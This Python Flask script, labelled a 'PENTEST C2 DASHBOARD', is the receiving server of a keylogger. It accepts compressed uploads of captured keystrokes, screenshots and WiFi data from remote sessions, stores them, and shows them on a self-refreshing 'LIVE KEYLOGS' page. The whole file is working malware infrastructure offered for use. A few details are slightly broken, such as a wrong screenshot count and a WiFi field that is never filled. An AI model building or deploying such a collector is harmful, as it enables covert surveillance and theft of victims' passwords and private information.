#!/usr/bin/env python3
from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS
import os, json, base64, zlib
from datetime import datetime
from pathlib import Path

app = Flask(__name__)
CORS(app)

DATA_DIR = Path("data")
for dir_path in ["logs", "screenshots"]:
    (DATA_DIR / dir_path).mkdir(parents=True, exist_ok=True)

@app.route("/receive", methods=["POST"])
def receive():
    try:
        data = request.get_json()
        session = data.get("session", "unknown")
        compressed_data = base64.b64decode(data["data"])
        payload = json.loads(zlib.decompress(compressed_data).decode('utf-8'))
        
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        # Save raw JSON log
        log_file = DATA_DIR / "logs" / f"{session}_{ts}.json"
        with open(log_file, "w") as f:
            json.dump(payload, f, indent=2)
        
        # Save screenshots
        for i, shot in enumerate(payload.get("screenshots", [])):
            try:
                img_data = base64.b64decode(shot["data"])
                img_file = DATA_DIR / "screenshots" / f"{session}_{i}_{ts}.jpg"
                with open(img_file, "wb") as f:
                    f.write(img_data)
            except:
                pass
        
        print(f"📥 Received from {session}: {len(payload.get('keys', []))} keys")
        return jsonify({"status": "ok", "session": session, "keys": len(payload.get('keys', []))})
        
    except Exception as e:
        print(f"❌ Receive error: {e}")
        return jsonify({"error": str(e)}), 500

@app.route("/")
@app.route("/dashboard")
def dashboard():
    sessions = []
    for log_file in DATA_DIR.glob("logs/*.json"):
        try:
            with open(log_file) as f:
                data = json.load(f)
            sessions.append({
                "session": log_file.stem.split("_")[0],
                "keys": len(data.get("keys", [])),
                "time": log_file.stat().st_mtime,
                "screenshots": len(data.get("screenshots", []))
            })
        except:
            pass
    
    html = f"""
<!DOCTYPE html>
<html>
<head><title>🔥 PENTEST C2 DASHBOARD</title>
<style>
body{{background:black;color:lime;font-family:monospace;padding:30px;font-size:14px}}
.session{{background:#111;padding:15px;margin:10px 0;border-left:4px solid lime}}
img{{max-width:300px;max-height:200px;margin:10px;border:1px solid #333}}
h2{{color:#0f0;margin:0}}
.stats{{color:#888;font-size:12px}}
.refresh{{position:fixed;top:10px;right:10px;background:lime;color:black;padding:5px;cursor:pointer}}
</style>
</head>
<body>
<div class="refresh" onclick="location.reload()">🔄 REFRESH</div>
<h1>🚀 LIVE KEYLOGS ({len(sessions)} sessions)</h1>
"""
    
    for session in sorted(sessions, key=lambda x: x['time'], reverse=True):
        html += f"""
<div class="session">
<h2>{session['session']} <span class="stats">({session['keys']} keys | {len(sessions)} shots)</span></h2>
<pre style="background:#000;padding:10px;overflow:auto">
Keys: {json.dumps(session.get('keys', []), indent=2)[:500]}...
WiFi: {json.dumps(session.get('wifi', []), indent=2)}
</pre>
<a href="/logs/{session['session']}.json">📄 Full Log</a>
</div>
"""
    
    html += """
<script>setInterval(() => location.reload(), 15000);</script>
</body></html>"""
    
    return html

@app.route("/logs/<session>.json")
def get_log(session):
    for log_file in DATA_DIR.glob("logs/*.json"):
        if session in log_file.name:
            return send_from_directory(DATA_DIR / "logs", log_file.name)
    return "Not found", 404

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    print(f"🚀 Server running on port {port}")
    app.run(host="0.0.0.0", port=port, debug=False)